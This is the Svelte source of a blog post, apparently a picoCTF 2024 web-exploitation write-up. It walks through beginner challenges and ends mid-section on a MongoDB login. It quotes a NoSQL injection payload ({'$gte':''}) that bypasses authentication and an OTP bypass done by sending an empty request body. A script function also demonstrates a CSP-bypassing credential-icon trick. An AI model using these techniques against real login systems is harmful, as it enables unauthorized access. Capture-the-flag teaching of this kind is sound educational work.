<script context="module">
  export const metadata = {
    title: "picoCTF 2024 web rundown",
    published: "2024-03-26",
    defaultLayout: false,
    navbarColor: "from-white",
  };
</script>

<script lang="ts">
  import Prism from "$lib/components/Prism.svelte";
  import IPrism from "$lib/components/IPrism.svelte";
  import Key from "$lib/components/Key.svelte";
  import { KeyRound, Wand2 } from "lucide-svelte";
  import { detect } from "detect-browser";
  import DiscordMention from "$lib/components/DiscordMention.svelte";
  import HTTP from "$lib/components/HTTP.svelte";
  import "prismjs/components/prism-markup-templating";
  import "prismjs/components/prism-php";
  import "prismjs/components/prism-diff";
  import "prismjs/components/prism-python";
  import ElementsDfsResult from "$lib/components/blog/pico-2024/ElementsDfsResult.svelte";
  import { onMount } from "svelte";

  const browser = detect();
  const CONSOLE_KEY = browser?.name === "firefox" ? "K" : "J";
  const EXPAND_NAME = browser?.name === "firefox" ? "Expand All" : "Expand recursively";

  const BOOKMARKLET_SOURCE = `javascript:(function() {
    var encryptedFlag = "àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓÔÅÐÙí";
    var key = "picoctf";
    var decryptedFlag = "";
    for (var i = 0; i < encryptedFlag.length; i++) {
        decryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);
    }
    alert(decryptedFlag);
})();`;

  let itbForm = {
    full_name: "a",
    username: "a",
    phone_number: "a",
    city: "a",
    password: "a",
  };
  let itbOtp = "a";
  let itbBody = "otp=a";
  $: itbParams = new URLSearchParams(itbBody);
  let itbIncorrect = "Incorrect OTP";
  $: itbCorrect = `Welcome, ${itbForm.username} you sucessfully bypassed the OTP request.
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_2e80f1fd}`;

  const stopDefault = (e: MouseEvent) => {
    e.preventDefault();
    return false;
  };

  // Elements
  // prettier-ignore
  const recipes = [["Ash", "Fire", "Charcoal"],["Steam Engine", "Water", "Vapor"],["Brick Oven", "Heat Engine", "Oven"],["Steam Engine", "Swamp", "Sauna"],["Magma", "Mud", "Obsidian"],["Earth", "Mud", "Clay"],["Volcano", "Water", "Volcanic Rock"],["Brick", "Fog", "Cloud"],["Obsidian", "Rain", "Black Rain"],["Colorful Pattern", "Fire", "Rainbow Fire"],["Cloud", "Obsidian", "Storm"],["Ash", "Obsidian", "Volcanic Glass"],["Electricity", "Haze", "Static"],["Fire", "Water", "Steam"],["Dust", "Rainbow", "Powder"],["Computer Chip", "Steam Engine", "Artificial Intelligence"],["Fire", "Mud", "Brick"],["Hot Spring", "Swamp", "Sulfur"],["Adobe", "Graphic Design", "Web Design"],["Colorful Interface", "Data", "Visualization"],["IoT", "Security", "Encryption"],["Colorful Pattern", "Mosaic", "Patterned Design"],["Earth", "Steam Engine", "Excavator"],["Cloud Computing", "Data", "Data Mining"],["Earth", "Water", "Mud"],["Brick", "Fire", "Brick Oven"],["Colorful Pattern", "Obsidian", "Art"],["Rain", "Steam Engine", "Hydropower"],["Colorful Display", "Graphic Design", "Colorful Interface"],["Fire", "Mist", "Fog"],["Exploit", "Web Design", "XSS"],["Computer Chip", "Hot Spring", "Smart Thermostat"],["Earth", "Fire", "Magma"],["Air", "Earth", "Dust"],["Cloud", "Rainbow", "Rainbow Cloud"],["Dust", "Heat Engine", "Sand"],["Obsidian", "Thunderstorm", "Lightning Conductor"],["Cloud", "Rain", "Thunderstorm"],["Adobe", "Cloud", "Software"],["Hot Spring", "Rainbow", "Colorful Steam"],["Dust", "Fire", "Ash"],["Cement", "Swamp", "Marsh"],["Hot Tub", "Mud", "Mud Bath"],["Electricity", "Glass", "Computer Chip"],["Ceramic", "Fire", "Earthenware"],["Haze", "Swamp", "Fog Machine"],["Rain", "Rainbow", "Colorful Display"],["Brick", "Water", "Cement"],["Dust", "Haze", "Sandstorm"],["Ash", "Hot Spring", "Geothermal Energy"],["Ash Rock", "Heat Engine", "Mineral"],["Electricity", "Software", "Program"],["Computer Chip", "Fire", "Data"],["Colorful Pattern", "Swamp", "Algae"],["Fog", "Water", "Rain"],["Rainbow Pool", "Reflection", "Color Spectrum"],["Artificial Intelligence", "Data", "Encryption"],["Internet", "Smart Thermostat", "IoT"],["Cinder", "Heat Engine", "Ash Rock"],["Brick", "Swamp", "Mudbrick"],["Computer Chip", "Volcano", "Data Mining"],["Obsidian", "Water", "Hot Spring"],["Computer Chip", "Thunderstorm", "Power Surge"],["Brick", "Obsidian", "Paving Stone"],["User Input", "Visualization", "Interactive Design"],["Mist", "Mud", "Swamp"],["Geolocation", "Wall", "Map"],["Air", "Rock", "Internet"],["Computer Chip", "Rain", "Email"],["Fire", "Rainbow", "Colorful Flames"],["Hot Spring", "Mineral Spring", "Healing Water"],["Ceramic", "Volcano", "Lava Lamp"],["Brick Oven", "Wall", "Fireplace"],["Glass", "Software", "Vulnerability"],["Fog", "Mud", "Sludge"],["Fire", "Marsh", "S'mores"],["Artificial Intelligence", "Data Mining", "Machine Learning"],["Ash", "Brick", "Brick Kiln"],["Fire", "Obsidian", "Heat Resistant Material"],["Hot Spring", "Sludge", "Steam Engine"],["Artificial Intelligence", "Computer Chip", "Smart Device"],["Fire", "Steam Engine", "Heat Engine"],["Ash", "Earth", "Cinder"],["Rainbow", "Reflection", "Refraction"],["Encryption", "Software", "Cybersecurity"],["Graphic Design", "Mosaic", "Artwork"],["Colorful Display", "Data Mining", "Visualization"],["Hot Spring", "Water", "Mineral Spring"],["Rainbow", "Swamp", "Reflection"],["Air", "Fire", "Smoke"],["Program", "Smart HVAC System", "Smart Thermostat"],["Haze", "Obsidian", "Blackout"],["Brick", "Earth", "Wall"],["Heat Engine", "Steam Locomotive", "Railway Engine"],["Ash", "Thunderstorm", "Volcanic Lightning"],["Mud", "Water", "Silt"],["Colorful Pattern", "Hot Spring", "Rainbow Pool"],["Fire", "Sand", "Glass"],["Art", "Web Design", "Graphic Design"],["Internet", "Machine Learning", "Smart HVAC System"],["Electricity", "Power Surge", "Overload"],["Colorful Pattern", "Computer Chip", "Graphic Design"],["Air", "Water", "Mist"],["Brick Oven", "Cement", "Concrete"],["Artificial Intelligence", "Cloud", "Cloud Computing"],["Computer Chip", "Earth", "Geolocation"],["Color Spectrum", "Graphic Design", "Colorful Interface"],["Internet", "Program", "Web Design"],["Computer Chip", "Overload", "Circuit Failure"],["Data Mining", "Geolocation", "Location Tracking"],["Heat Engine", "Smart Thermostat", "Smart HVAC System"],["Brick", "Mud", "Adobe"],["Cloud", "Dust", "Rainbow"],["Hot Spring", "Obsidian", "Hot Tub"],["Steam Engine", "Volcano", "Geothermal Power Plant"],["Earth", "Fog", "Haze"],["Brick", "Steam Engine", "Steam Locomotive"],["Brick", "Colorful Pattern", "Mosaic"],["Hot Spring", "Steam Engine", "Electricity"],["Ash", "Volcano", "Volcanic Ash"],["Electricity", "Water", "Hydroelectric Power"],["Brick", "Rainbow", "Colorful Pattern"],["Silt", "Volcano", "Lava"],["Computer Chip", "Software", "Program"],["Hot Spring", "Thunderstorm", "Lightning"],["Ash", "Clay", "Ceramic"],["Cybersecurity", "Vulnerability", "Exploit"],["Ash", "Heat Engine", "Ash Residue"],["Internet", "Smart Device", "Cloud Computing"],["Magma", "Mist", "Rock"],["Interactive Design", "Program", "Smart Device"],["Computer Chip", "Electricity", "Software"],["Colorful Pattern", "Graphic Design", "Design Template"],["Fire", "Magma", "Volcano"],["Earth", "Obsidian", "Computer Chip"],["Geolocation", "Location Tracking", "Real-Time Positioning"]];
  const graph: { [k: string]: [string, string] } = {};

  for (const [u1, u2, v] of recipes) {
    graph[v] = [u1, u2];
  }

  const vis: { [k: string]: boolean } = {};
  const base = ["Fire", "Air", "Water", "Earth"];
  const out: [string, string][] = [];
  let allowedStep = 0;
  let step = 0;
  interface DfsResult {
    result: string;
    step: number;
    found?: boolean;
    children: number;
    a: DfsResult | null;
    b: DfsResult | null;
  }

  const dfs = (u: string): DfsResult | null => {
    const callStep = step++;
    if (vis[u]) {
      return {
        result: u,
        found: true,
        step: callStep,
        children: 1,
        a: null,
        b: null,
      };
    }

    if (base.includes(u)) {
      return {
        result: u,
        step: callStep,
        children: 1,
        a: null,
        b: null,
      };
    }

    vis[u] = true;
    const a = graph[u] ? dfs(graph[u][0]) : null;
    const b = graph[u] ? dfs(graph[u][1]) : null;

    out.push(graph[u]);
    return {
      result: u,
      step: callStep,
      children: (a?.children ?? 0) + (b?.children ?? 0),
      a,
      b,
    };
  };

  const filterCallTree = (tree: DfsResult | null, allowed: number): DfsResult | null => {
    if (!tree || tree.step > allowed) return null;
    return {
      ...tree,
      a: filterCallTree(tree.a, allowed),
      b: filterCallTree(tree.b, allowed),
    };
  };

  const callTree = dfs("XSS");
  $: filteredCallTree = filterCallTree(callTree, allowedStep);
  let headings: HTMLHeadingElement[] | null = null;
  let elementHeadings: HTMLHeadingElement[] | null = null;
  // console.log(JSON.stringify(out))
  onMount(() => {
    headings = [...document.querySelectorAll("h2")].filter((x) => !!x.id);
    elementHeadings = [...document.querySelectorAll("h3.elements-heading")] as HTMLHeadingElement[];
  });

  const elementsPayload = () => {
    const cred = new FederatedCredential({
      id: "← this image bypasses csp",
      provider: "https://voxal.dev",
      iconURL: "https://voxal.dev/images/pwned.png",
    });
    navigator.credentials.store(cred);
  };
</script>

<svelte:head>
  <meta property="og:url" content="https://voxal.dev/blog/pico-24-web" />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="picoCTF 2024 Web Exploitation Rundown" />
  <meta property="og:description" content="a collection of writeups by aiden shi" />
  <meta property="og:image" content="https://voxal.dev/images/pico-24/bg.jpg" />
</svelte:head>

<header class="flex items-end h-screen bg-[url(/images/blog/pico-24/bg.jpg)] bg-cover">
  <div class="mb-12 ml-12 drop-shadow-xl">
    <h2 class="mb-4 text-lg md:text-2xl">picoCTF 2024</h2>
    <h1 class="leading-[0.9] text-4xl md:text-8xl">Web Exploitation</h1>
    <h1 class="text-4xl md:text-8xl">Rundown</h1>

    <h3>Published {metadata.published}</h3>
  </div>
</header>

<article
  class="relative max-w-3xl mx-auto pb-24 mt-24 px-8 md:px-0 tw-prose-invert tw-prose md:tw-prose-lg tw-prose-code:before:content-none tw-prose-code:after:content-none tw-prose-code:bg-zinc-800 tw-prose-code:rounded tw-prose-code:py-0.5 tw-prose-code:px-1.5 tw-prose-a:text-blue-300"
  id="article-content"
>
  {#if headings && elementHeadings}
    <div
      class="hidden lg:block absolute left-[calc(50%+24rem+2rem)] not-tw-prose h-[100%] w-64 text-base leading-normal"
    >
      <div class="sticky left-0 top-14">
        <details open class="text-white">
          <summary class="cursor-pointer"> Table of Contents </summary>
          <ul class="leading-relaxed">
            {#each headings as entry}
              <li>
                <a href="#{entry.id}" class="hover:underline">{entry.innerText}</a>
              </li>
              {#if entry.id === "elements"}
                <ul class="mb-1 ml-4">
                  {#each elementHeadings as entry}
                    <li>
                      <a href="#{entry.id}" class="hover:underline">{entry.innerText}</a>
                    </li>
                  {/each}
                </ul>{/if}
            {/each}
          </ul>
        </details>
      </div>
    </div>
  {/if}
  <h2>Introduction</h2>
  <p>
    picoCTF is an annual CTF comptition hosted by Carnegie Mellon University for highschoolers. Our
    team <a href="https://amateurs.team" target="_blank">les amateurs</a> plays each year and this year
    was no different. This year we placed 2nd place.
  </p>
  <p>
    I solved all the web challenges for the team, along with some other miscellaneous challenges.
    This post will outline our problem solving process. I hope this format can help you how to solve
    the challenges, not just the solution.
  </p>

  <h2 id="bookmarklet">Bookmarklet</h2>
  <p>
    <a href="http://titan.picoctf.net:55173/" target="_blank">Bookmarklet</a> was a challenge was
    about bookmarklets (duh), which are snippets of javascript that can be bookmarked. A bookmarklet
    was provided in a
    <code>textarea</code>, which when ran, gave you the flag.
  </p>
  <Prism code={BOOKMARKLET_SOURCE} />
  <p>
    All you needed to do was execute the javascript. Here are a couple ways that you could have
    executed it.
  </p>
  <p>
    You could create a new bookmark with the URL being the javascript. There are a couple ways of
    doing this. First is to right click your bookmark bar, press Add Page, and in the URL bar copy
    the code in. It will look similar to the model below.
  </p>
  <div class="p-8 m-auto rounded-lg bg-zinc-800 not-tw-prose">
    <h4 class="mb-2">Add Bookmark</h4>
    <label for="name" class="block text-sm">Name</label>
    <input id="name" class="w-full px-2 mb-4 rounded-md bg-zinc-700" value="get flag" />
    <label for="name" class="block text-sm">URL</label>
    <input id="url" class="w-full px-2 rounded-md bg-zinc-700" value={BOOKMARKLET_SOURCE} />
    <div class="mt-6 text-end">
      <button class="px-3 py-1 mr-2 text-blue-300 border border-blue-300 rounded-md">Cancel</button>
      <button class="px-3 py-1 text-white bg-blue-400 border border-blue-400 rounded-md">
        Save
      </button>
    </div>
  </div>

  <p>
    The nice thing about bookmarklets is that since they are URLs you can drag them to the bookmark
    bar like any other URL. You can drag the below to the bookmark bar to recieve the flag as well.
  </p>
  <!-- svelte-ignore a11y-invalid-attribute -->
  <a
    class="px-3 py-1 !text-white bg-blue-400 border border-blue-400 rounded-md !font-serif"
    on:click={stopDefault}
    href={"javascript:(function() { var encryptedFlag = \"àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓÔÅÐÙí\"; }); alert(`Please don't drag these from websites you don't trust, when you click on these bookmarks, you are executing arbitrary javascript code, which could be dangerous and could lead to an attack known as Self-XSS. \\n\\nPlease stay safe out there!`)"}
  >
    Drag Me
  </a>

  <p>
    Thats how you solve it with bookmarks, I solved it by opening the console with <Key>Ctrl</Key>
    + <Key>Shift</Key> + <Key>{CONSOLE_KEY}</Key>, then copy and pasted the code into the console
    and ran it.
  </p>
  <p>
    Basically with any way you can execute javascript, you can solve the challenge. Its not meant to
    be a hard challenge but its interesting to analyze all the different ways you can solve this
    challenge.
  </p>
  <h2 id="webdecode">WebDecode</h2>
  <p>
    <a href="http://titan.picoctf.net:57534" target="_blank">WebDecode</a> was an inspector
    challenge. Clicking through the page, you'll find that the about page tells you to try
    inspecting on that page (
    <Key>Ctrl</Key> + <Key>Shift</Key> + <Key>I</Key>), and if you do, you'll find something
    suspicious sitting there.
  </p>
  <Prism
    code={`<section class="about" notify_true="cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfZGYwZGE3Mjd9">
   <h1>
    Try inspecting the page!! You might find it there
   </h1>
   <!-- .about-container -->
</section>`}
    lang="html"
  />

  <p>
    That <code>notify_true</code> attribute looks awfully suspicious! It also looks like something that
    is Base64 encoded.
  </p>
  <!-- <blockquote>How do you know its Base64 encoded?</blockquote>
  <p>
    It comes with practice, I've come across a lot of Base64 encoded stuff and brains are good at
    recognizing patterns, so its very quick for me to recognize if something is Base64 or not. Other
    than that, Base64 is a very common encoding for the web because its safe to use in URLs, so its
    also right to make educated guesses about what the encoding is.
  </p> -->
  <p>
    We can use <a href="https://gchq.github.io/CyberChef" target="_blank">CyberChef</a> to decode
    this. It is personally my tool of choice when it comes to decoding stuff. Addtionally, CyberChef
    can detect common encodings and automatically decode them for you! Just press the <Wand2
      class="inline"
    /> button after pasting the input and it will automatically decode your input!
  </p>

  <h2 id="unminify">Unminify</h2>
  <p>
    This challenge is pretty similar to WebDecode. You are given a
    <a href="http://titan.picoctf.net:51196/" target="_blank">website</a> and are told to find the
    flag. Again we can open the inspect menu (<Key>Ctrl</Key> + <Key>Shift</Key> + <Key>I</Key>) and
    take a look at what the markup looks like. There are a lot nested elements so we can use a nice
    feature of DevTools, {EXPAND_NAME.toLowerCase()}.
  </p>
  <div class="m-auto mb-5 not-tw-prose w-fit">
    <IPrism code={`<body class="picoctf{}" style="margin:0">`} class="relative -z-10" />
    <div class="z-10 ml-8 -mt-4 rounded-md bg-zinc-700 w-fit">
      <div class="px-4 py-2">
        <div>Edit as HTML</div>
        <div>Create New Node</div>
      </div>
      <hr class="border-zinc-500" />
      <div class="px-4 py-2">...</div>
      <hr class="border-zinc-500" />
      <div class="bg-blue-400/30"><span class="px-4 py-2">{EXPAND_NAME}</span></div>
      <div class="px-4 pb-2">Collapse All</div>
    </div>
  </div>
  <p>
    Right click on the <code>body</code> element and press {EXPAND_NAME}, Then you can just go ahead
    and scroll through the markup looking for the flag.
  </p>

  <p>
    Firefox also has a really nice "Search HTML" bar where you can search for <code>picoCTF</code> and
    find the flag. (Another reason why firefox is superior to chrome)
  </p>

  <h2 id="introtoburp">IntroToBurp</h2>
  <p>
    Ok the inspector challenges are done. Next up is IntroToBurp. As the name implies, you can use
    <a href="https://portswigger.net/burp" target="_blank">BurpSuite</a> to solve this challenge, but
    like all other web challenges this isn't nessasary.
  </p>
  <p>The page looks like this:</p>
  <div class="p-8 m-auto rounded-lg bg-zinc-800 not-tw-prose">
    <h2 class="mb-8 text-3xl">Registration</h2>
    <form>
      <label for="full_name">Full Name:</label>
      <input
        id="full_name"
        name="full_name"
        bind:value={itbForm.full_name}
        required
        type="text"
        class="px-2 mb-4 rounded-md bg-zinc-700"
      />
      <br />
      <label for="username">Username:</label>
      <input
        id="username"
        name="username"
        bind:value={itbForm.username}
        required
        type="text"
        class="px-2 mb-4 rounded-md bg-zinc-700"
      />
      <br />
      <label for="phone_number">Phone Number:</label>
      <input
        id="phone_number"
        name="phone_number"
        bind:value={itbForm.phone_number}
        required
        type="text"
        class="px-2 mb-4 rounded-md bg-zinc-700"
      />
      <br />
      <label for="city">City:</label>
      <input
        id="city"
        name="city"
        bind:value={itbForm.city}
        required
        type="text"
        class="px-2 mb-4 rounded-md bg-zinc-700"
      />
      <br />
      <label for="password">Password:</label>
      <input
        id="password"
        name="password"
        bind:value={itbForm.password}
        required
        type="password"
        class="px-2 mb-4 rounded-md bg-zinc-700"
      />
      <br /><br />
      <input
        id="submit"
        name="submit"
        type="submit"
        value="Register"
        on:click={stopDefault}
        class="px-3 py-1 text-white bg-blue-400 border border-blue-400 rounded-md cursor-pointer"
      />
    </form>
  </div>
  <p>
    Right, one more thing before we get into the challenge. It is important that you understand how
    HTTP requests for this challenge. I'll go over them quickly in the next section, but you should
    make sure you really understand them because this challenge relies on you understanding them.
  </p>
  <h3>Http Requests</h3>
  <p>
    <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Messages" target="_blank"
      >HTTP requests</a
    > are the "text messages" of the internet. Your browser sends HTTP requests to servers which will
    then process and reply with a response, which is then displayed on your screen. HTTP requests are
    made up of 3 sections, the Request Line, the Headers, and the Body.
  </p>
  <div class="p-4 font-mono rounded-lg not-tw-prose bg-zinc-800">
    <div class="flex items-center justify-between px-4 rounded-md bg-green-500/10">
      POST /dashboard HTTP/1.1
      <div class="py-1 font-serif text-base italic text-center">Request Line</div>
    </div>
    <div class="flex items-center justify-between px-4 rounded-md bg-purple-500/10">
      <div>
        <div>Host: titan.picoctf.net:57434</div>
        <div>Content-Length: {encodeURIComponent(itbOtp).length + 4}</div>
        <div>Content-Type: application/x-www-form-urlencoded</div>
      </div>
      <div class="py-1 font-serif text-base italic text-center">Headers</div>
    </div>
    <br />
    <div class="flex items-center justify-between px-4 rounded-md bg-yellow-500/10">
      <div>otp={encodeURIComponent(itbOtp)}</div>
      <div class="py-1 font-serif text-base italic text-center">Body</div>
    </div>
  </div>
  <p>Lets go over each portion and what info it stores:</p>
  <ul>
    <li>
      <b>Request Line:</b> This contains the
      <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods" target="_blank">Method</a
      >, path, and HTTP version
    </li>
    <li>
      <b>Headers:</b> This contains key-value pairs with info about the request, info like
      <code>User-Agent</code> which tells the server which browser they are using or
      <code>Content-Length</code> which specifies the length of the body.
    </li>
    <li>
      <b>Body:</b> The main bulk of the request. Contains things like form details or passwords on a
      login page.
    </li>
  </ul>

  <p>
    The body can be any file type, and the type of file is defined by the <code>Content-Type</code>
    header. In this case the type is <code>application/x-www-form-urlencoded</code> which contain multiple
    key-value pairs like such.
  </p>

  <div class="px-8 py-4 font-mono rounded-lg bg-zinc-800">
    key<span class="text-yellow-400">=</span>value<span class="text-purple-400">&</span>key2<span
      class="text-yellow-400">=</span
    >value2<span class="text-purple-400">&</span>key3<span class="text-yellow-400">=</span>value3
  </div>

  <p>
    Many applications use <code>application/json</code> for the body, for instance
    <a href="#no-sql-injection">No Sql Injection</a> uses
    <code>application/json</code>
    for its forms. File uploads also use the body field, for example if you inspect a file upload in
    <a href="#trickster">Trickster</a>, you'll see the file itself getting uploaded in the body.
  </p>
  <p>
    This was a really quick introduction into HTTP requests, but if you still don't understand them,
    I recommend doing some research yourself.
  </p>
  <hr class="max-w-xl m-auto" />
  <p>
    We can fill this form with some random information. As seen above, I just filled it out with <code
      >a</code
    >. When we submit the form, a POST request is made to the current page.
  </p>
  <p>A POST request indicates to the server that we want want them to store this data.</p>
  <HTTP
    class="p-8 rounded-lg not-tw-prose bg-zinc-800"
    method="POST"
    url="http://titan.picoctf.net:57434/"
    status={302}
    reqBody={{
      type: "application/x-www-form-urlencoded",
      data: {
        csrf_token: "...",
        ...itbForm,
        submit: "Register",
      },
    }}
    resCookies={{
      session: {
        httpOnly: true,
        path: "/",
        value: ".eJw9jEsKAyEQRO_iOgsdP21yGWm1h4TMqPhhCCF3j4Ehu3pVvHqz8Ogvd...",
      },
    }}
    resHeaders={{
      Location: "/dashboard",
      Server: "Werkzeug/3.0.1 Python/3.8.10",
    }}
  />
  <p>
    After submitting the form, the server returns us a cookie which is a session token. that our
    browser will use for later requests. It also sends back a <code>Location</code> header which
    tells our browser to redirect to <code>/dashboard</code>. (Note that the status code is 302.
    Status codes in the 3XX range always mean redirect)
  </p>
  <p>
    Anyways we are then redirected to <code>/dashboard</code>, where there is a single input box
    asking for a one time password. It looks something like this.
  </p>
  <div class="p-8 m-auto rounded-lg bg-zinc-800 not-tw-prose">
    <h2 class="mb-4 text-3xl">2fa authentication</h2>
    <form method="POST">
      <input
        type="text"
        name="otp"
        bind:value={itbOtp}
        placeholder="Enter OTP"
        class="px-2 mb-4 rounded-md bg-zinc-700"
      />
      <button
        type="submit"
        class="px-3 text-white bg-blue-400 rounded-md cursor-pointer"
        on:click={stopDefault}
        >Submit
      </button>
    </form>
  </div>
  <p>If we enter anything and press the button, the following request is made:</p>
  <HTTP
    class="p-8 rounded-lg not-tw-prose bg-zinc-800"
    method="POST"
    url="http://titan.picoctf.net:57434/dashboard"
    status={200}
    reqBody={{
      type: "application/x-www-form-urlencoded",
      data: {
        otp: itbOtp,
      },
    }}
    resBody={{
      type: "text/html",
      data: itbIncorrect,
    }}
  />
  <p>
    Yikes, not any other info is given to us, so it looks like we just need to bypass the otp check
    somehow. At this point, it really isn't obvious how to procced, but if you read the hints, one
    of them is
  </p>
  <blockquote>
    Try mangling the request, maybe their server-side code doesn't handle malformed requests very
    well.
  </blockquote>

  <p>
    Lets start messing with the requests to see if we can get anywhere. Again,
    <a href="https://portswigger.net/burp" target="_blank">BurpSuite</a> can be used to solve the challenge.
    Here are the steps to modify a request in Burp.
  </p>

  <ol>
    <li>Go to the <code>Target</code> tab, open the browser</li>
    <li>
      Navigate to the page you want, then replicate the request you want to make. In this case we
      want to replicate the <code>POST /dashboard</code> request which is made when you enter an OTP
    </li>
    <li>Back in the Burp Suite window, right click the request, press "Send to Repeater"</li>
    <li>Click the <code>Repeater</code> tab, and start editing the request on the left</li>
    <li>
      Press the
      <span class="bg-[#d86633] font-medium px-4 mx-0.5 py-1 rounded-md font-sans">Send</span>
      button
    </li>
  </ol>

  <p>
    This was actually the first time I used Burp Suite to solve a challenge like this, generally
    when I need to repeat a request, I navigate to the network tab of DevTools, right click the
    request and "Copy as Fetch" then use the javascript console to repeat the request.
  </p>

  <p>
    A lot of people may tell you to learn Burp or whatever, but at the end of the day, it really
    doesn't matter which tool you use. Don't feel pressued to use any specific tool, fancy tools can
    help but at the end of the day you are limited by how much you know.
  </p>

  <p>
    We'll try messing around with the body first. In BurpSuite the body should be the
    <code>otp={encodeURIComponent(itbOtp)}</code> part of the request.
  </p>

  <p>
    I encourage you to mess around with the body yourself a bit. try changing that part of the
    request around and see what happens. Here is a recreation of the challenge. Try entering tings
    into the body and see what happens.
  </p>
  <input
    type="text"
    name="body"
    bind:value={itbBody}
    placeholder="Enter Body"
    class="w-full px-2 mb-4 rounded-md bg-zinc-800"
  />
  <HTTP
    class="p-8 rounded-lg not-tw-prose bg-zinc-800"
    method="POST"
    url="http://titan.picoctf.net:57434/dashboard"
    status={200}
    reqBody={{
      type: "application/x-www-form-urlencoded",
      data:
        itbBody === ""
          ? "<empty>"
          : itbParams.size !== 1 || [...itbParams.values()].some((v) => v !== "")
            ? Object.fromEntries(itbParams.entries())
            : itbBody,
    }}
    resBody={{
      type: "text/html",
      data: itbParams.has("otp") ? itbIncorrect : itbCorrect,
    }}
  />
  <hr class="max-w-xl m-auto" />
  <p>
    Hopefully you've played around with the challenge a little bit, because I'm about to spoil the
    solution. <br />.<br />.<br />.<br />.<br />.
  </p>

  <p>
    The first thing I tried was to remove the body entirely. To my suprise, sending an empty request
    actually worked and I got the flag.
  </p>

  <HTTP
    class="p-8 rounded-lg not-tw-prose bg-zinc-800"
    method="POST"
    url="http://titan.picoctf.net:57434/dashboard"
    status={200}
    reqBody={{
      type: "application/x-www-form-urlencoded",
      data: "<empty>",
    }}
    resBody={{
      type: "text/html",
      data: itbCorrect,
    }}
  />
  <p>
    Here are some other things you could have tried, take a look at what happens with each of these
    bodies.
  </p>
  <ul>
    <li>
      <a
        on:click={(e) => {
          itbBody = "key=value";
          stopDefault(e);
        }}
        href="#"><code>key=value</code></a
      >
    </li>
    <li>
      <a
        on:click={(e) => {
          itbBody = "otp";
          stopDefault(e);
        }}
        href="#"><code>otp</code></a
      >
    </li>
    <li>
      <a
        on:click={(e) => {
          itbBody = "otp=a";
          stopDefault(e);
        }}
        href="#"><code>otp=a</code></a
      >
    </li>
    <li>
      <a
        on:click={(e) => {
          itbBody = "some random text";
          stopDefault(e);
        }}
        href="#"><code>some random text</code></a
      >
    </li>
    <li>
      <a
        on:click={(e) => {
          itbBody = "somethingelse=a&otp=b";
          stopDefault(e);
        }}
        href="#"><code>somethingelse=a&otp=b</code></a
      >
    </li>
  </ul>
  <input
    type="text"
    name="body"
    bind:value={itbBody}
    placeholder="Enter Body"
    class="w-full px-2 mb-4 rounded-md bg-zinc-800"
  />
  <HTTP
    class="p-8 rounded-lg not-tw-prose bg-zinc-800"
    method="POST"
    url="http://titan.picoctf.net:57434/dashboard"
    status={200}
    reqBody={{
      type: "application/x-www-form-urlencoded",
      data:
        itbBody === ""
          ? "<empty>"
          : itbParams.size !== 1 || [...itbParams.values()].some((v) => v !== "")
            ? Object.fromEntries(itbParams.entries())
            : itbBody,
    }}
    resBody={{
      type: "text/html",
      data: itbParams.has("otp") ? itbIncorrect : itbCorrect,
    }}
  />

  <h2 id="no-sql-injection">No Sql Injection</h2>

  <p>
    True to its name, there is No SQL Injection, but there NoSQL Injection!
    <a href="https://en.wikipedia.org/wiki/NoSQL" target="_blank">NoSQL</a> refers to non-relational
    database structures where all data is stored under one singular data structure. In this
    challenge, the NoSQL database of choice is MongoDB, and they use a javascript library known as
    <a href="https://npmjs.com/mongoose" target="_blank"><code>mongoose</code></a> to interface with
    it.
  </p>

  <p>
    In a lot of database injection challenges, it's good practice to look at where the flag is, so
    it's easier to extract later, in this case, a quick search for flag shows that its part of the
    user schema.
  </p>

  <Prism
    code={`const UserSchema: Schema = new Schema({
  email: { type: String, required: true, unique: true },
  firstName: { type: String, required: true },
  lastName: { type: String, required: true },
  password: { type: String, required: true },
  token: { type: String, required: false ,default: "{{Flag}}"},
});`}
  />

  <p>
    The <code>User</code> schema can be found in two places, first when they place a seed user into
    the database in <code>seed.ts</code>, and secondly for the login page in <code>route.ts</code>.
  </p>

  <Prism
    code={`export const POST = async (req: any) => {
  const { email, password } = await req.json();
  try {
    await connectToDB();
    await seedUsers();
    const users = await User.find({
      email: email.startsWith("{") && email.endsWith("}") 
        ? JSON.parse(email) 
        : email,
      password: password.startsWith("{") && password.endsWith("}") 
        ? JSON.parse(password) 
        : password
    });

    if (users.length < 1)
      return new Response("Invalid email or password", { status: 401 });
    else {
      return new Response(JSON.stringify(users), { status: 200 });
    }
  } catch (error) {
    return new Response("Internal Server Error", { status: 500 });
  }
};
`}
  />

  <p>
    The most important line is when <code>User.f&zwnj;ind</code> is called. Basically, if our
    username or password starts with <code>{"{"}</code>, it'll parse it as JSON and use that as the
    argument for
    <code>User.f&zwnj;ind</code>.
  </p>

  <p>
    Lets take a look at
    <a href="https://mongoosejs.com/docs/api/model.html#Model.find()" target="_blank">the docs</a>
    for mongoose to see what we can do with objects in the <code>User.f&zwnj;ind</code>.
  </p>

  <Prism
    code={`// find all documents
await MyModel.find({});

// find all documents named john and at least 18
await MyModel.find({ name: 'john', age: { \$gte: 18 } }).exec();

// executes, name LIKE john and only selecting the "name" and "friends" fields
await MyModel.find({ name: /john/i }, 'name friends').exec();

// passing options
await MyModel.find({ name: /john/i }, null, { skip: 10 }).exec();`}
  />

  <p>
    Hmmm alright, looks like we can do some fancy stuff with objects like <code>$gte</code> or even
    regex! At this point I wasn't sure what to do, I could try using <code>$gte</code> to bypass the
    login screen, but I wasn't completely sold on using <code>$gte</code> to bypass the check. So instead,
    I decided to do some more research.
  </p>

  <p>
    After a quick google search I stumbled upon
    <a href="https://stackoverflow.com/questions/52707399" target="_blank"
      >this StackOverflow post</a
    > which had just the payload I needed
  </p>
  <Prism
    code={`{
    "email": { "$gte": "" },
    "password": { "$gte": "" }
}`}
  />

  <p>
    Hah! Take that critical thinking and problem solving! Yet again, Google proves to be the best
    resource in CTF, we can enter <code>{`{ "$gte": "" }`}</code> into both fields, and that will log
    us in.
  </p>

  <p>
    This works because mongoose will try to find any user who's email and password is greater than
    or equal to <code>""</code> and any email or password wil be greater than or equal to
    <code>""</code>.
  </p>

  <p>
